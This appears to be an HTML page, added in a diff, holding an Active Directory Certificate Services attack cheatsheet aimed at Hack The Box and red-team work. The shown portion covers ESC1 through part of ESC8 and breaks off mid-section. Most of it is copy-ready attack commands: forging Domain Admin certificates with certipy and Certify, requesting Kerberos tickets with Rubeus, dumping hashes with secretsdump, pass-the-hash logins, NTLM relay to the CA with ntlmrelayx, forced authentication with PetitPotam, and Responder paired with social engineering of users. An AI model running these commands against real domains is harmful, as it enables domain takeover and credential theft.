@@ -1,0 +1,1108 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="../assets/components.js"></script>
+  <style>
+    /* ── MD Cheatsheet Styles ── */
+    .md-h1 {
+      font-family: var(--mono);
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--text);
+      margin: 0 0 6px;
+    }
+
+    .md-h3 {
+      font-family: var(--mono);
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--accent);
+      margin: 24px 0 10px;
+      letter-spacing: .03em;
+    }
+
+    .md-h4 {
+      font-family: var(--mono);
+      font-size: 12px;
+      font-weight: 500;
+      color: var(--orange);
+      margin: 18px 0 8px;
+    }
+
+    .md-p {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--muted);
+      line-height: 1.8;
+      margin: 10px 0;
+    }
+
+    .md-hr {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 32px 0;
+    }
+
+    .md-ul,
+    .md-ol {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--muted);
+      line-height: 1.8;
+      padding-left: 20px;
+      margin: 8px 0;
+    }
+
+    .md-ul li,
+    .md-ol li {
+      margin: 2px 0;
+    }
+
+    .md-ol a,
+    .md-ul a {
+      color: #c4d4d4;
+      text-decoration: none;
+    }
+
+    .md-ol a:hover,
+    .md-ul a:hover {
+      text-decoration: underline;
+    }
+
+    .md-blockquote {
+      border-left: 3px solid var(--green);
+      padding: 8px 14px;
+      background: rgba(57, 211, 83, .05);
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--muted);
+      margin: 10px 0;
+      border-radius: 0 6px 6px 0;
+    }
+
+    .inline-code {
+      background: var(--surface2);
+      color: var(--accent);
+      padding: 1px 6px;
+      border-radius: 4px;
+      font-family: var(--mono);
+      font-size: 11px;
+      border: 1px solid var(--border);
+    }
+
+    .md-table-wrap {
+      overflow-x: auto;
+      margin: 14px 0;
+    }
+
+    .md-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-family: var(--mono);
+      font-size: 11px;
+    }
+
+    .md-table th {
+      background: var(--surface);
+      color: var(--text);
+      padding: 8px 12px;
+      border: 1px solid var(--border);
+      text-align: left;
+    }
+
+    .md-table td {
+      color: var(--muted);
+      padding: 7px 12px;
+      border: 1px solid var(--border);
+    }
+
+    .md-table tr:hover td {
+      background: var(--bg3);
+      color: var(--text);
+    }
+
+    .cm {
+      color: #3d4450;
+      font-style: italic;
+    }
+
+    .page-header {
+      margin-bottom: 32px;
+      padding-bottom: 16px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .page-header-sub {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--muted);
+      margin-top: 6px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="page-content">
+
+    <div class="page-header">
+      <h1 class="md-h1">ADCS — Active Directory Certificate Services Attack Cheatsheet</h1>
+      <div class="page-header-sub">by J0stif &nbsp;·&nbsp; ESC1 through ESC13 + Full Exploitation Chain</div>
+    </div>
+
+    <hr class="md-hr">
+    <div class="sec-hdr" id="table-of-contents" style="margin-top:36px"><span class="sec-title">📋 TABLE OF
+        CONTENTS</span><span class="sec-line"></span></div>
+    <ol class="md-ol">
+      <li><a href="#adcs-overview--setup">ADCS Overview & Setup</a></li>
+      <li><a href="#enumeration">Enumeration</a></li>
+      <li><a href="#esc1--misconfigured-certificate-templates">ESC1 — Misconfigured Certificate Templates</a></li>
+      <li><a href="#esc2--any-purpose-eku">ESC2 — Any Purpose EKU</a></li>
+      <li><a href="#esc3--certificate-request-agent">ESC3 — Certificate Request Agent</a></li>
+      <li><a href="#esc4--vulnerable-certificate-template-acl">ESC4 — Vulnerable Certificate Template ACL</a></li>
+      <li><a href="#esc6--editf_attributesubjectaltname2">ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2</a></li>
+      <li><a href="#esc7--vulnerable-ca-acl">ESC7 — Vulnerable CA ACL</a></li>
+      <li><a href="#esc8--ntlm-relay-to-ad-cs-http-endpoints">ESC8 — NTLM Relay to AD CS HTTP Endpoints</a></li>
+      <li><a href="#esc9--esc10--no-security-extension--weak-cert-mapping">ESC9 & ESC10 — No Security Extension / Weak
+          Cert Mapping</a></li>
+      <li><a href="#esc11--relay-icpr">ESC11 — Relay ICPR</a></li>
+      <li><a href="#esc13--oid-group-link">ESC13 — OID Group Link</a></li>
+      <li><a href="#using-certificates--authentication--ptt">Using Certificates — Authentication & PTT</a></li>
+      <li><a href="#post-exploitation-with-certificates">Post-Exploitation with Certificates</a></li>
+      <li><a href="#persistence-via-certificates">Persistence via Certificates</a></li>
+    </ol>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="adcs-overview-setup" style="margin-top:36px"><span class="sec-title">🔧 ADCS Overview &
+        Setup</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="what-is-adcs">What is ADCS?</h3>
+    <p class="md-p">Active Directory Certificate Services (ADCS) is Microsoft's PKI implementation inside AD. It issues
+      X.509 certificates used for:</p>
+    <ul class="md-ul">
+      <li>Authentication (logging in with a cert instead of a password)</li>
+      <li>Code signing, EFS, SSL/TLS</li>
+      <li>Smart card logon</li>
+    </ul>
+    <p class="md-p"><strong>Why it matters for HTB/Red Team:</strong> A misconfigured ADCS can allow any domain user to
+      obtain a certificate that impersonates a Domain Admin, then use that cert to get a Kerberos TGT and dump hashes.
+    </p>
+    <h3 class="md-h3" id="key-concepts">Key Concepts</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">CA (Certificate Authority) — The server issuing certificates (usually a DC or dedicated
+        server)
+        Certificate Template — Blueprint defining what a cert can do, who can request it
+        EKU (Enhanced Key Usage) — Defines allowed uses: Client Auth, Code Signing, Any Purpose...
+        SAN (Subject Alternative Name) — Alternative identity in the cert (can be set to any user)
+        PKINIT — Kerberos extension allowing cert-based authentication
+        UPN (User Principal Name) — user@domain.htb — used to map cert to AD account</div>
+    </div>
+    <h3 class="md-h3" id="tool-setup">Tool Setup</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Certipy (primary tool — Kali/Linux)</span>
+        pip3 install certipy-ad
+        certipy --version
+
+        <span class="cm"># Certify (Windows — C# binary)</span>
+        <span class="cm"># Download: https://github.com/GhostPack/Certify</span>
+
+        <span class="cm"># PKINITtools (Kerberos cert auth from Linux)</span>
+        git clone https://github.com/dirkjanm/PKINITtools
+        pip3 install impacket minikerberos
+
+        <span class="cm"># pywhisker (shadow credentials)</span>
+        git clone https://github.com/ShutdownRepo/pywhisker
+        pip3 install -r pywhisker/requirements.txt
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="enumeration" style="margin-top:36px"><span class="sec-title">Enumeration</span><span
+        class="sec-line"></span></div>
+    <h3 class="md-h3" id="certipy-from-kali">Certipy (from Kali)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Full ADCS enumeration — finds vulnerable templates</span>
+        certipy find -u user@domain.htb -p 'password' -dc-ip $DC
+        certipy find -u user@domain.htb -p 'password' -dc-ip $DC -vulnerable -stdout
+        certipy find -u user@domain.htb -p 'password' -dc-ip $DC -vulnerable -text -output adcs_enum
+
+        <span class="cm"># With hash</span>
+        certipy find -u user@domain.htb -hashes :NTLM_HASH -dc-ip $DC -vulnerable -stdout
+
+        <span class="cm"># With Kerberos</span>
+        certipy find -u user@domain.htb -p 'password' -dc-ip $DC -k -vulnerable
+
+        <span class="cm"># Output files: adcs_enum.txt, adcs_enum.json, adcs_enum.bloodhound.zip</span>
+        <span class="cm"># Upload bloodhound zip to BloodHound for visual analysis</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="certify-from-windows">Certify (from Windows)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Full enumeration
+        .\Certify.exe find
+        .\Certify.exe find /vulnerable
+        .\Certify.exe find /vulnerable /currentuser
+
+        :: List CAs
+        .\Certify.exe cas
+
+        :: List templates
+        .\Certify.exe templates
+
+        :: List enrollment endpoints
+        .\Certify.exe find /showAllPermissions</div>
+    </div>
+    <h3 class="md-h3" id="manual-enumeration-via-ldap">Manual Enumeration via LDAP</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Find ADCS servers</span>
+        ldapsearch -x -H ldap://$DC -D user@domain.htb -w 'pass' -b "CN=Configuration,DC=domain,DC=htb"
+        "(objectClass=pKIEnrollmentService)"
+
+        <span class="cm"># Find vulnerable templates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 1)</span>
+        ldapsearch -x -H ldap://$DC -D user@domain.htb -w 'pass' -b "CN=Certificate Templates,CN=Public Key
+        Services,CN=Services,CN=Configuration,DC=domain,DC=htb"
+        "(msPKI-Certificate-Name-Flag:1.2.840.113556.1.4.804:=1)"
+
+        <span class="cm"># CrackMapExec</span>
+        crackmapexec ldap $DC -u user -p pass -M adcs
+      </div>
+    </div>
+    <h3 class="md-h3" id="bloodhound-adcs-queries">BloodHound ADCS Queries</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Custom queries to add in BloodHound (after uploading Certipy bloodhound
+          zip):</span>
+        MATCH (n:GPO) WHERE n.type = 'Certificate Template' and n.Enabled = true RETURN n
+        MATCH p=(g)-[:Enroll|AutoEnroll]-&gt;(n:GPO) WHERE n.type = 'Certificate Template' and n.Enabled = true RETURN p
+        MATCH p=shortestPath((g:Group)-[r*1..]-&gt;(n:Computer {unconstraineddelegation:true})) WHERE g.name =~ 'DOMAIN
+        USERS.*' RETURN p</div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="esc1-misconfigured-certificate-templates" style="margin-top:36px"><span
+        class="sec-title">ESC1 — Misconfigured Certificate Templates</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="what-makes-it-vulnerable">What Makes It Vulnerable</h3>
+    <p class="md-p">All three conditions must be true:</p>
+    <ol class="md-ol">
+      <li><strong>Manager approval disabled</strong> (no human review required)</li>
+      <li><strong>Enrollee can specify a SAN</strong> (<code
+          class="inline-code">CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag set)</li>
+      <li><strong>Certificate enables client authentication</strong> (EKU includes Client Auth, PKINIT, Smart Card
+        Logon, or Any Purpose)</li>
+      <li><strong>Low-privileged user has enrollment rights</strong></li>
+    </ol>
+    <h3 class="md-h3" id="detection">Detection</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Certipy output will show:</span>
+        <span class="cm"># [!] Vulnerabilities</span>
+        <span class="cm"># ESC1 : ...</span>
+        <span class="cm"># Template : VulnerableTemplate</span>
+        <span class="cm"># ...</span>
+        <span class="cm"># [!] Enrollee Supplies Subject : True</span>
+        <span class="cm"># [!] Extended Key Usages : Client Authentication</span>
+
+        certipy find -u user@domain.htb -p 'pass' -dc-ip $DC -vulnerable -stdout
+
+        <span class="cm"># Certify (Windows)</span>
+        .\Certify.exe find /vulnerable
+        <span class="cm"># Look for: msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="exploitation-certipy-linux">Exploitation — Certipy (Linux)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Step 1: Request certificate as Domain Admin (specify SAN/UPN)</span>
+        certipy req -u user@domain.htb -p 'password' -ca CA-NAME -template VulnerableTemplate -upn
+        administrator@domain.htb -dc-ip $DC
+
+        <span class="cm"># This creates: administrator.pfx</span>
+
+        <span class="cm"># Step 2: Authenticate with the certificate → get hash</span>
+        certipy auth -pfx administrator.pfx -domain domain.htb -username administrator -dc-ip $DC
+
+        <span class="cm"># Output:</span>
+        <span class="cm"># administrator@domain.htb's hash: NTLM_HASH</span>
+        <span class="cm"># Got TGT — saved to administrator.ccache</span>
+
+        <span class="cm"># Step 3: Use hash or TGT</span>
+        export KRB5CCNAME=administrator.ccache
+        impacket-secretsdump -k -no-pass domain.htb/administrator@$DC
+
+        <span class="cm"># Or PTH</span>
+        impacket-psexec -hashes :NTLM_HASH administrator@$IP
+        evil-winrm -i $IP -u administrator -H NTLM_HASH
+        crackmapexec smb $IP -u administrator -H NTLM_HASH
+      </div>
+    </div>
+    <h3 class="md-h3" id="exploitation-certify-rubeus-windows">Exploitation — Certify + Rubeus (Windows)</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">cmd</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">:: Step 1: Request certificate
+        .\Certify.exe request /ca:CA-SERVER\CA-NAME /template:VulnerableTemplate /altname:administrator
+
+        :: Copy the -----BEGIN RSA PRIVATE KEY----- block + certificate
+        :: Save to cert.pem on Kali
+
+        :: Step 2: Convert PEM to PFX on Kali
+        openssl pkcs12 -in cert.pem -keyfile key.pem -export -out cert.pfx -password pass:""
+        <span class="cm"># Or both in same file:</span>
+        openssl pkcs12 -in combined.pem -export -out cert.pfx -password pass:""
+
+        :: Step 3: Use Rubeus to authenticate
+        .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:"" /nowrap /ptt
+
+        :: Or get NTLM hash
+        .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show /nowrap
+      </div>
+    </div>
+    <h3 class="md-h3" id="alternative-upns-to-try">Alternative UPNs to Try</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Always try these targets:</span>
+        certipy req ... -upn administrator@domain.htb <span class="cm"># built-in admin</span>
+        certipy req ... -upn Administrator@domain.htb <span class="cm"># case variation</span>
+        certipy req ... -upn krbtgt@domain.htb <span class="cm"># krbtgt (for golden tickets)</span>
+        certipy req ... -upn DC$@domain.htb <span class="cm"># DC machine account</span>
+        certipy req ... -upn "domain admin username"@domain.htb</div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="esc2-any-purpose-eku" style="margin-top:36px"><span class="sec-title">ESC2 — Any Purpose
+        EKU</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="what-makes-it-vulnerable">What Makes It Vulnerable</h3>
+    <p class="md-p">Template has <strong>Any Purpose</strong> EKU (or no EKU at all), which means the certificate can be
+      used for anything — including client authentication.</p>
+    <h3 class="md-h3" id="detection">Detection</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">certipy find -vulnerable -stdout
+        <span class="cm"># Look for: Extended Key Usages: Any Purpose</span>
+        <span class="cm"># Or: No EKU defined</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="exploitation">Exploitation</h3>
+    <p class="md-p">Same as ESC1 if the enrollee can supply SAN. If not, use the certificate as an enrollment agent
+      (similar to ESC3).</p>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># If SAN can be specified:</span>
+        certipy req -u user@domain.htb -p 'pass' -ca CA-NAME -template ESC2Template -upn administrator@domain.htb -dc-ip
+        $DC
+        certipy auth -pfx administrator.pfx -dc-ip $DC
+
+        <span class="cm"># If SAN cannot be specified — use as enrollment agent (ESC3 path):</span>
+        certipy req -u user@domain.htb -p 'pass' -ca CA-NAME -template ESC2Template -dc-ip $DC
+        <span class="cm"># Then use obtained cert to enroll for another template on behalf of admin</span>
+        certipy req -u user@domain.htb -p 'pass' -ca CA-NAME -template User -on-behalf-of 'domain\administrator' -pfx
+        esc2.pfx -dc-ip $DC
+        certipy auth -pfx administrator.pfx -dc-ip $DC
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="esc3-certificate-request-agent" style="margin-top:36px"><span class="sec-title">ESC3 —
+        Certificate Request Agent</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="what-makes-it-vulnerable">What Makes It Vulnerable</h3>
+    <p class="md-p">Two templates exploited in sequence:</p>
+    <ol class="md-ol">
+      <li><strong>Template A</strong>: Has "Certificate Request Agent" EKU — allows requesting certs on behalf of others
+      </li>
+      <li><strong>Template B</strong>: Has "Certificate Request Agent" in Application Policy issuance requirements, AND
+        allows enrollment for Certificate Request Agents</li>
+    </ol>
+    <h3 class="md-h3" id="exploitation">Exploitation</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Step 1: Enroll in the Certificate Request Agent template</span>
+        certipy req -u user@domain.htb -p 'pass' -ca CA-NAME -template ESC3-CertRequestAgent -dc-ip $DC
+        <span class="cm"># Saves: user.pfx</span>
+
+        <span class="cm"># Step 2: Use agent cert to request cert on behalf of administrator</span>
+        certipy req -u user@domain.htb -p 'pass' -ca CA-NAME -template ESC3-Template2 -on-behalf-of
+        'domain\administrator' -pfx user.pfx -dc-ip $DC
+        <span class="cm"># Saves: administrator.pfx</span>
+
+        <span class="cm"># Step 3: Authenticate</span>
+        certipy auth -pfx administrator.pfx -domain domain.htb -dc-ip $DC
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="esc4-vulnerable-certificate-template-acl" style="margin-top:36px"><span
+        class="sec-title">ESC4 — Vulnerable Certificate Template ACL</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="what-makes-it-vulnerable">What Makes It Vulnerable</h3>
+    <p class="md-p">A low-privileged user has <strong>write permissions</strong> over a certificate template
+      (GenericWrite, WriteDACL, WriteOwner, FullControl). This allows modifying the template to introduce ESC1
+      vulnerabilities.</p>
+    <h3 class="md-h3" id="detection">Detection</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">certipy find -vulnerable -stdout
+        <span class="cm"># Look for: ESC4</span>
+        <span class="cm"># Shows which principal has write access to the template</span>
+
+        <span class="cm"># Certify (Windows)</span>
+        .\Certify.exe find /showAllPermissions
+        <span class="cm"># Look for non-admin users with write/fullcontrol on a template</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="exploitation">Exploitation</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Step 1: Save the current template configuration (to restore
+          later)</span>
+        certipy template -u user@domain.htb -p 'pass' -template VulnerableTemplate -save-old -dc-ip $DC
+
+        <span class="cm"># Step 2: Modify the template to make it ESC1-vulnerable</span>
+        certipy template -u user@domain.htb -p 'pass' -template VulnerableTemplate -dc-ip $DC
+
+        <span class="cm"># (certipy automatically sets: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, Client Auth EKU, disable
+          manager approval)</span>
+
+        <span class="cm"># Step 3: Request cert as admin (now it's ESC1)</span>
+        certipy req -u user@domain.htb -p 'pass' -ca CA-NAME -template VulnerableTemplate -upn administrator@domain.htb
+        -dc-ip $DC
+
+        <span class="cm"># Step 4: Restore the original template (cleanup)</span>
+        certipy template -u user@domain.htb -p 'pass' -template VulnerableTemplate -configuration
+        VulnerableTemplate.json -dc-ip $DC
+
+        <span class="cm"># Step 5: Authenticate</span>
+        certipy auth -pfx administrator.pfx -domain domain.htb -dc-ip $DC
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="esc6-editfattributesubjectaltname2" style="margin-top:36px"><span class="sec-title">ESC6 —
+        EDITF_ATTRIBUTESUBJECTALTNAME2</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="what-makes-it-vulnerable">What Makes It Vulnerable</h3>
+    <p class="md-p">The CA has the <code class="inline-code">EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag set on the CA
+      itself (not on a specific template). This flag allows <strong>any</strong> certificate request to specify a SAN,
+      even if the template doesn't explicitly allow it.</p>
+    <h3 class="md-h3" id="detection">Detection</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">certipy find -vulnerable -stdout
+        <span class="cm"># Look for: ESC6</span>
+        <span class="cm"># [!] CA Permissions</span>
+        <span class="cm"># [!] EDITF_ATTRIBUTESUBJECTALTNAME2 : Enabled</span>
+
+        <span class="cm"># Certify</span>
+        .\Certify.exe cas
+        <span class="cm"># Look for: EDITF_ATTRIBUTESUBJECTALTNAME2 set</span>
+      </div>
+    </div>
+    <h3 class="md-h3" id="exploitation">Exploitation</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Can use ANY template with Client Auth EKU — even the default "User"
+          template</span>
+        certipy req -u user@domain.htb -p 'pass' -ca CA-NAME -template User -upn administrator@domain.htb -dc-ip $DC
+        certipy auth -pfx administrator.pfx -domain domain.htb -dc-ip $DC
+
+        <span class="cm"># Certify + Rubeus (Windows)</span>
+        .\Certify.exe request /ca:CA-SERVER\CA-NAME /template:User /altname:administrator
+        <span class="cm"># Convert and use with Rubeus as shown in ESC1</span>
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="esc7-vulnerable-ca-acl" style="margin-top:36px"><span class="sec-title">ESC7 — Vulnerable
+        CA ACL</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="what-makes-it-vulnerable">What Makes It Vulnerable</h3>
+    <p class="md-p">A low-privileged user has <strong>ManageCA</strong> or <strong>ManageCertificates</strong> rights on
+      the CA object itself.</p>
+    <ul class="md-ul">
+      <li><strong>ManageCertificates</strong> → can approve pending certificate requests</li>
+      <li><strong>ManageCA</strong> → can change CA configuration, including enabling <code
+          class="inline-code">EDITF_ATTRIBUTESUBJECTALTNAME2</code> (→ ESC6)</li>
+    </ul>
+    <h3 class="md-h3" id="detection">Detection</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">certipy find -vulnerable -stdout
+        <span class="cm"># Look for: ESC7</span>
+        <span class="cm"># [!] CA Name : domain-CA</span>
+        <span class="cm"># [!] Permissions</span>
+        <span class="cm"># [!] ManageCA : compromised_user</span>
+
+        <span class="cm"># Certify</span>
+        .\Certify.exe cas /showAllPermissions
+      </div>
+    </div>
+    <h3 class="md-h3" id="exploitation-manageca-esc6">Exploitation — ManageCA → ESC6</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Step 1: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 using ManageCA
+          rights</span>
+        certipy ca -u user@domain.htb -p 'pass' -ca CA-NAME -enable-flag EDITF_ATTRIBUTESUBJECTALTNAME2 -dc-ip $DC
+
+        <span class="cm"># Step 2: Now exploit as ESC6</span>
+        certipy req -u user@domain.htb -p 'pass' -ca CA-NAME -template User -upn administrator@domain.htb -dc-ip $DC
+        certipy auth -pfx administrator.pfx -domain domain.htb -dc-ip $DC
+      </div>
+    </div>
+    <h3 class="md-h3" id="exploitation-managecertificates-approve-pending-requests">Exploitation — ManageCertificates →
+      Approve Pending Requests</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Step 1: Request a cert that requires manager approval (will be in
+          PENDING state)</span>
+        certipy req -u user@domain.htb -p 'pass' -ca CA-NAME -template Requires-Approval-Template -upn
+        administrator@domain.htb -dc-ip $DC
+        <span class="cm"># Output: Request ID: 13</span>
+
+        <span class="cm"># Step 2: Issue (approve) the pending request using ManageCertificates</span>
+        certipy ca -u user@domain.htb -p 'pass' -ca CA-NAME -issue-request 13 -dc-ip $DC
+
+        <span class="cm"># Step 3: Retrieve the approved certificate</span>
+        certipy req -u user@domain.htb -p 'pass' -ca CA-NAME -retrieve 13 -dc-ip $DC
+        <span class="cm"># Saves: administrator.pfx</span>
+
+        <span class="cm"># Step 4: Authenticate</span>
+        certipy auth -pfx administrator.pfx -domain domain.htb -dc-ip $DC
+      </div>
+    </div>
+    <hr class="md-hr">
+    <div class="sec-hdr" id="esc8-ntlm-relay-to-ad-cs-http-endpoints" style="margin-top:36px"><span
+        class="sec-title">ESC8 — NTLM Relay to AD CS HTTP Endpoints</span><span class="sec-line"></span></div>
+    <h3 class="md-h3" id="what-makes-it-vulnerable">What Makes It Vulnerable</h3>
+    <p class="md-p">The CA has a <strong>web enrollment endpoint</strong> (<code
+        class="inline-code">http://CA-SERVER/certsrv</code>) that supports NTLM authentication and does not require
+      HTTPS or enforce Extended Protection for Authentication (EPA). NTLM authentication can be relayed here.</p>
+    <h3 class="md-h3" id="detection">Detection</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body">certipy find -vulnerable -stdout
+        <span class="cm"># Look for: ESC8</span>
+        <span class="cm"># [!] Web Enrollment : Enabled</span>
+        <span class="cm"># URL : http://ca-server/certsrv/</span>
+
+        <span class="cm"># Manual check</span>
+        curl -I http://$CA_SERVER/certsrv/
+        <span class="cm"># If it returns 401 with NTLM → vulnerable</span>
+
+        nmap --script http-auth-finder -p 80,443 $CA_SERVER
+      </div>
+    </div>
+    <h3 class="md-h3" id="exploitation">Exploitation</h3>
+    <div class="terminal">
+      <div class="term-bar"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+          class="dot dot-g"></span><span class="term-label">bash</span><button class="copy-btn"
+          onclick="copyTerm(this)">copy</button></div>
+      <div class="term-body"><span class="cm"># Step 1: Start ntlmrelayx — relay to the CA web enrollment</span>
+        <span class="cm"># For a standard DC cert (gets DC auth cert):</span>
+        impacket-ntlmrelayx -t http://$CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+        <span class="cm"># For a user cert:</span>
+        impacket-ntlmrelayx -t http://$CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template User
+
+        <span class="cm"># Step 2: Trigger NTLM authentication from a target (DC)</span>
+        <span class="cm"># PetitPotam (no auth — forces DC to authenticate)</span>
+        python3 PetitPotam.py $LHOST $DC
+
+        <span class="cm"># PrinterBug (SpoolSample)</span>
+        python3 SpoolSample.py $DC $LHOST
+
+        <span class="cm"># Responder (for users)</span>
+        responder -I tun0 -rdwv <span class="cm"># then socially engineer user to access \\$LHOST\share</span>
+
+        <span class="cm"># Step 3: ntlmrelayx captures the authentication and requests a cert</span>
+        <span class="cm"># Output: Got certificate! Saved to: DC$.pfx (base64 printed in terminal)</span>
+        <span class="cm"># Save the base64 to a file and decode:</span>
+        echo "BASE64==" | base64 -d &gt; DC.pfx
+
+        <span class="cm"># Or certipy can relay directly:</span>
+        certipy relay -ca $CA_SERVER -template DomainController
+
